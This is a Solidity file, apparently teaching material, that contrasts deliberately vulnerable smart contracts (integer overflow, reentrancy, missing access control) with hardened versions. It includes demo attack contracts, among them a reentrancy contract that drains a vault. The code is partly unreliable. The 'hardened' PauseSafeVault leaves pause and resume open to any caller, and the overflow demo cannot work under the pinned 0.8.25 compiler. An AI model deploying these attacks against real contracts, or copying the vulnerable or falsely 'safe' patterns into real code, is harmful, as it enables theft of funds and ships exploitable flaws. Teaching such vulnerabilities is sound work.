// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

/*//////////////////////////////////////////////////////////////
                      SHARED ERROR DEFINITIONS
//////////////////////////////////////////////////////////////*/
error Unauthorized();
error Reentrancy();
error Overflow();
error Paused();

/*//////////////////////////////////////////////////////////////
                  0.  LIBRARIES & ABSTRACT GUARDS
//////////////////////////////////////////////////////////////*/
library SafeMathLib {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) revert Overflow();
            return c;
        }
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        unchecked {
            if (b > a) revert Overflow();
            return a - b;
        }
    }
}

/// @notice Simple re‑entrancy lock (gas‑cheap: one storage slot)
abstract contract NonReentrant {
    uint256 private _status;
    modifier nonReentrant() {
        if (_status == 1) revert Reentrancy();
        _status = 1;
        _;
        _status = 0;
    }
}

/// @notice Toggle‑able circuit‑breaker
abstract contract Pausable {
    bool private _paused;
    modifier whenNotPaused() {
        if (_paused) revert Paused();
        _;
    }
    function _pause() internal { _paused = true; }
    function _unpause() internal { _paused = false; }
    function paused() external view returns (bool) { return _paused; }
}

/*//////////////////////////////////////////////////////////////
          1.  ARITHMETIC SAFETY  – Vulnerable vs Hardened
//////////////////////////////////////////////////////////////*/
contract ArithmeticVulnerableToken {
    mapping(address => uint256) public balance;
    function mint(uint256 amt) external { balance[msg.sender] += amt; }    // may overflow (<0.8.0)
    function burn(uint256 amt) external { balance[msg.sender] -= amt; }    // may underflow (<0.8.0)
}

contract ArithmeticSafeToken {
    using SafeMathLib for uint256;
    mapping(address => uint256) public balance;
    function mint(uint256 amt) external { balance[msg.sender] = balance[msg.sender].add(amt); }
    function burn(uint256 amt) external { balance[msg.sender] = balance[msg.sender].sub(amt); }
}

/* --- Overflow demo exploit --- */
contract OverflowAttack {
    ArithmeticVulnerableToken public target;
    constructor(ArithmeticVulnerableToken _t) { target = _t; }
    function attack() external {
        target.mint(type(uint256).max);   // set balance to 2²⁵⁶‑1
        target.mint(1);                   // wraps to 0 in <0.8.0 compilers
    }
}

/*//////////////////////////////////////////////////////////////
               2.  REENTRANCY SAFETY  – Vulnerable vs Safe
//////////////////////////////////////////////////////////////*/
contract ReentrancyVulnerableVault {
    mapping(address => uint256) public bal;
    function deposit() external payable { bal[msg.sender] += msg.value; }
    function withdraw() external {
        uint256 amt = bal[msg.sender];
        require(amt > 0, "0");
        (bool ok, ) = msg.sender.call{value: amt}(""); // external call first!
        require(ok, "xfer");
        bal[msg.sender] = 0;                           // state updated *after*
    }
}

contract ReentrancySafeVault is NonReentrant {
    mapping(address => uint256) public bal;
    function deposit() external payable { bal[msg.sender] += msg.value; }
    function withdraw() external nonReentrant {
        uint256 amt = bal[msg.sender];
        require(amt > 0, "0");
        bal[msg.sender] = 0;                           // ***effects first***
        (bool ok, ) = msg.sender.call{value: amt}("");
        require(ok, "xfer");
    }
}

/* --- Re‑entrancy demo exploit --- */
contract ReentrancyAttack {
    ReentrancyVulnerableVault public target;
    constructor(ReentrancyVulnerableVault _t) { target = _t; }
    receive() external payable {
        if (address(target).balance >= 1 ether) {      // keep draining
            target.withdraw();
        }
    }
    function run() external payable {
        require(msg.value == 1 ether, "need 1 ETH");
        target.deposit{value: 1 ether}();
        target.withdraw();
    }
}

/*//////////////////////////////////////////////////////////////
        3.  ACCESS‑CONTROL SAFETY  – Vulnerable vs Safe
//////////////////////////////////////////////////////////////*/
contract AccessVulnerable {
    uint256 public secretNumber;
    function setSecret(uint256 n) external {            // ✗ open to anyone
        secretNumber = n;
    }
}

contract AccessSafe {
    uint256 public secretNumber;
    address public immutable owner = msg.sender;
    function setSecret(uint256 n) external {
        if (msg.sender != owner) revert Unauthorized();
        secretNumber = n;
    }
}

/* --- Unauthorized admin call demo --- */
contract UnauthorizedAttack {
    AccessVulnerable public target;
    constructor(AccessVulnerable _t) { target = _t; }
    function attack(uint256 val) external { target.setSecret(val); }
}

/*//////////////////////////////////////////////////////////////
       4.  PAUSE (CIRCUIT‑BREAKER) SAFETY  – Hardened Only
//////////////////////////////////////////////////////////////*/
contract PauseSafeVault is Pausable {
    uint256 public value;
    function set(uint256 v) external whenNotPaused { value = v; }
    function emergencyPause() external { _pause(); }
    function resume() external { _unpause(); }
}

/* --- Example “exploit” that fails once paused --- */
contract PauseAttack {
    PauseSafeVault public target;
    constructor(PauseSafeVault _t) { target = _t; }
    function exploit(uint256 v) external { target.set(v); }
}
